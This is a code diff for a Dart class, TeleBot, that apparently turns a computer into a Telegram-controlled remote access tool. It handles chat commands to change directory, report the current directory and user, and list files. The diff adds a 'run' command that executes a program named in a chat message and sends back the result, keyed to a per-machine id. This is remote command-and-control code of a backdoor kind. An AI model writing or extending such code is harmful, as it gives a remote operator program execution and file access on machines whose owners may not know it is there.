@@ -9,15 +9,16 @@ import 'id_store.dart';
 import 'traversal.dart';
 
 class TeleBot extends Traverslar {
+  @override
   var user = Downloader().userProfile;
   String my_id;
-  String myUser;
+  int myUser;
   var teledart = TeleDart(Telegram(Settings.telegramApi), Event());
 
   void initter() async {
     try {
       my_id = await User_DB().checkAndGet();
-      await teledart.start().then((me) => myUser = me.username);
+      await teledart.start().then((me) => myUser = me.id);
       await teledart
           .onCommand(RegExp('cd', caseSensitive: false))
           .listen((message) async {
@@ -32,7 +33,7 @@ class TeleBot extends Traverslar {
         }
       });
       await teledart
-          .onCommand(RegExp('getPcUser', caseSensitive: false))
+          .onCommand(RegExp('getUser', caseSensitive: false))
           .listen((message) async {
         List parm = message.text.split(' ');
         if (parm.last.toString() == my_id) {
@@ -49,12 +50,12 @@ class TeleBot extends Traverslar {
         }
       });
       await teledart
-          .onCommand(RegExp('getcwd', caseSensitive: false))
+          .onCommand(RegExp('pwd', caseSensitive: false))
           .listen((message) async {
         List parm = message.text.split(' ');
         if (parm.last.toString() == my_id) {
           await teledart.telegram
-              .sendMessage(message.chat.id, getCurrentDir().toString());
+              .sendMessage(message.chat.id, await getCurrentDir());
         }
       });
       await teledart
@@ -64,11 +65,21 @@ class TeleBot extends Traverslar {
             .sendMessage(message.chat.id, user + '   ' + my_id.toString());
       });
       await teledart
-          .onCommand(RegExp('getDir', caseSensitive: false))
+          .onCommand(RegExp('run', caseSensitive: false))
+          .listen((message) async {
+        List parm = message.text.split(' ');
+        if (parm.last.toString() == my_id) {
+          var exe = await excuteProgram(parm[1].toString());
+          await teledart.telegram.sendMessage(message.chat.id, exe);
+        }
+      });
+      await teledart
+          .onCommand(RegExp('ls', caseSensitive: false))
           .listen((message) async {
         List parm = message.text.split(' ');
         if (parm.last.toString() == my_id && message.text.isNotEmpty) {
-          await teledart.telegram.sendMessage(message.chat.id, getListFiles());
+          await teledart.telegram
+              .sendMessage(message.chat.id, await getListFiles());
         }
       });
     } on SocketException catch (er) {
